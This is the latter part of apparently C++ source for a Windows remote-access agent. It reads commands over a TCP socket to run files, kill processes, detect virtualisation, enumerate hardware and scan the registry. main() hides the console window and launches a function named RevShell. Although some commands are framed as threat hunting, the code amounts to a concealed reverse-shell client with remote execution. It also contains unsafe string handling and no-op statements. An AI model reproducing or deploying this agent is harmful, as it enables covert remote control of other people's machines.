                            strcat(buffer,  "\n\t --- Confirmed Hostile Registry entry- Name: ");
                            strcat(buffer,  conname);
                        }
                    }
                    else{
                        strcat(buffer,  "\nSystem appears clean from known threats");
                    }
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "suppress\n") == 0)){
                // Toggles the tool for the suppression switch and reports back its status
                    char buffer[257] = "";

                    if (suppressflag == false){
                        suppressflag = true;
                        strcat(buffer, "\n SUPPRESSION IS SET ON\n");
                    }
                    else if (suppressflag == true){
                        suppressflag = false;
                        strcat(buffer, "\n SUPPRESSION IS SET OFF\n");
                    }

                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "help\n") == 0) || (strcmp(CommandReceived, "h\n") == 0)) {
                //Takes two types of arguments, the standard help as well as 'h' and displays a brief summary of all commands
                    char buffer[257] = "";
                    strcat(buffer, "\n\t Help - Usage: command | arg");
                    strcat(buffer, "\n\t\t - E.g 'exec test.mp3' \n\t =-=-=-=-=-=-=-=-=-= \n \t commands: ");
                    strcat(buffer, "\n\t - 'whoami' \n\t ---> Gets user");
                    strcat(buffer, "\n\t - 'hostname' \n\t ---> Gets the hostname");
                    strcat(buffer, "\n\t - 'pwd' \n\t ---> Gets the current working directory");
                    strcat(buffer, "\n\t - 'hardware' \n\t ---> Gets the current Hardware of the machine");
                    strcat(buffer, "\n\t - 'virmac' \n\t ---> Examines aspects of the host machine to detect virtualisation");
                    strcat(buffer, "\n\t - 'msg' \n\t ---> Creates a pop up on the host machine");
                    strcat(buffer, "\n\t - 'pasiv' \n\t ---> Passivelly waits for user interaction");
                    strcat(buffer, "\n\t - 'procs' \n\t ---> List all processes on the system");
                    strcat(buffer, "\n\t - 'hunter' \n\t ---> Hunter can be used to kill processes, type hunter for more");
                    strcat(buffer, "\n\t - 'klist' \n\t ---> List all processes currently being searched for");
                    strcat(buffer, "\n\t - 'regscan' \n\t ---> Scan the registry for suspicious entries");
                    strcat(buffer, "\n\t - 'exec' \n\t ---> Executes a file on the host machine, try exec filename.filetype");
                    strcat(buffer, "\n\t - 'find' \n\t ---> Finds a file on the host machine, try find c: ...");
                    strcat(buffer, "\n\t - 'addknown' \n\t ---> Adds a process to the list of confirmed hostile processes");
                    strcat(buffer, "\n\t - 'addsuspect' \n\t ---> Adds a process to the list of suspected processes");
                    strcat(buffer, "\n\t - 'suppress' \n\t ---> Supresses a process from ever running");
                    strcat(buffer, "\n\t - 'exit' \n\t ---> Stops everything, returns to console");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "exit\n") == 0)) {
                //Exit and close connections
                    char buffer[257] = "";
                    strcat(buffer,  "Releasing control");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    closesocket(tcpsock);
                    WSACleanup();
                    exit(0);
            }
            else {
                // Examine the buffer to see if it can be split by " ", if this is the case, 
                // then its likely a 'double barelled' command
                char splitval[DEFAULT_BUFLEN] = "";
                for(int i=0; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                {
                    //CommandReceived[i] is a pointer here and can only be compared with a integer, this *" "
                    if (CommandReceived[i] == *" ")    
                    {
                        break;
                    }
                    else
                    {
                        splitval[i] = CommandReceived[i];
                    }
                }
                if ((strcmp(splitval, "exec") == 0)) {
                    // Splits the argument as passes the file for execution to the function
                        char CommandExec[DEFAULT_BUFLEN] = "";
                        char CommandExecProc[Result -1] = "";
                        int j = 0;
                        for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                        {
                            CommandExec[j] = CommandReceived[i];
                            ++j;
                        }
                        CommandExec[strcspn(CommandExec, "\n")] = 0;
                        char buffer[257] = "";
                        exec(buffer, 257, CommandExec);
                        strcat(buffer, "\n");
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(splitval, "find") == 0)) {
                    // Takes the file to be searched for and searches path and current dir
                        char CommandExec[DEFAULT_BUFLEN] = "";
                        char CommandExecProc[Result -1] = "";
                        int j = 0;
                        for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                        {
                            CommandExec[j] = CommandReceived[i];
                            ++j;
                        }
                        CommandExec[strcspn(CommandExec, "\n")] = 0;
                        char buffer[257] = "";
                        find(buffer, 257, CommandExec);
                        strcat(buffer, "\n");
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(splitval, "kill") == 0)) {
                    // Kills a process, either by PID or name
                        char CommandExec[DEFAULT_BUFLEN] = "";
                        char buffer[257] = "";
                        int j = 0;
                        for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                        {
                            CommandExec[j] = CommandReceived[i];
                            ++j;
                        }
                        CommandExec[strcspn(CommandExec, "\n")] = 0;
                        kill(buffer, 257, CommandExec);
                        strcat(buffer, "\n");
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(splitval, "addknown") == 0)) {
                    //Essentially a helper function to add to the known hostile PID names
                        char CommandExec[DEFAULT_BUFLEN] = "";
                        char buffer[257] = "";
                        int j = 0;
                        for(int i=9; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                        {
                            CommandExec[j] = CommandReceived[i];
                            ++j;
                        }
                        CommandExec[strcspn(CommandExec, "\n")] = 0;
                    
                        targets.addConName(CommandExec);

                        strcat(buffer, "Added: '");
                        strcat(buffer, CommandExec);
                        strcat(buffer, "' to list of confirmed names\n");
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(splitval, "addsuspect") == 0)) {
                    //Essentially a helper function to add to the suspected PID names
                        char CommandExec[DEFAULT_BUFLEN] = "";
                        char buffer[257] = "";
                        int j = 0;
                        for(int i=11; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                        {
                            CommandExec[j] = CommandReceived[i];
                            ++j;
                        }
                        CommandExec[strcspn(CommandExec, "\n")] = 0;
                    
                        targets.addSusName(CommandExec);

                        strcat(buffer, "Added: '");
                        strcat(buffer, CommandExec);
                        strcat(buffer, "' to list of suspected names\n");
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(splitval, "hunter") == 0)){
                    //This function enumerates current processes and kills them based on the switch
                        char CommandExec[DEFAULT_BUFLEN] = "";
                        char buffer[257] = "";
                        int j = 0;
                        int killflag = 0;
                        for(int i=7; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                        {
                            CommandExec[j] = CommandReceived[i];
                            ++j;
                        }
                        CommandExec[strcspn(CommandExec, "\n")] = 0;

                        killflag = CommandExec[0] - '0';
                        Targ currenttargs = hunter(buffer, 257, targets);
                        scanreadout(buffer,257, currenttargs);
                        
                        if (killflag == 0){
                            // Perform a regular scan
                                strcat(buffer, "Scan complete \n");
                        }
                        else if (killflag == 1){
                            // Perform a regular scan then kill confirmed processes
                                strcat(buffer, "\n Kill requested on confirmed targets... \n");
                                if (currenttargs.getNosTarget() > 0){
                                    std::vector<Proc> targets = currenttargs.getTargets();
                                    for (int x = 0; x < targets.size(); x++){                
                                        char procname[32]; 
                                        strcpy(procname, targets[x].name.c_str()); 
                                        procname[sizeof(procname) - 1];
                                        kill(buffer, 257, procname);
                                    }
                                }else{
                                    strcat(buffer, " Alert - No threats were detected in the scan \n");
                                }
                            }
                        else if (killflag == 2){
                            // Perform a regular scan then kill suspected processes
                                strcat(buffer, "\n Kill requested on any suspected targets... \n");
                                if (currenttargs.getNosTarget() > 0){
                                    std::vector<Proc> suspects = currenttargs.getSuspects();
                                    for (int x = 0; x < suspects.size(); x++){
                                        char procname[32]; 
                                        strcpy(procname, suspects[x].name.c_str()); 
                                        procname[sizeof(procname) - 1];
                                        kill(buffer, 257, procname);
                                    }
                                }else{
                                strcat(buffer, " Alert - No threats were detected in the scan \n");
                                }
                            }

                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else {
                    // The command given was invalid, loop again
                        char buffer[20] = "Invalid Command\n";
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                        memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

//Main function
int main()
{

    HWND stealth;       //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth = FindWindowA("ConsoleWindowClass", NULL);      //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth, SW_SHIDE);                     //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}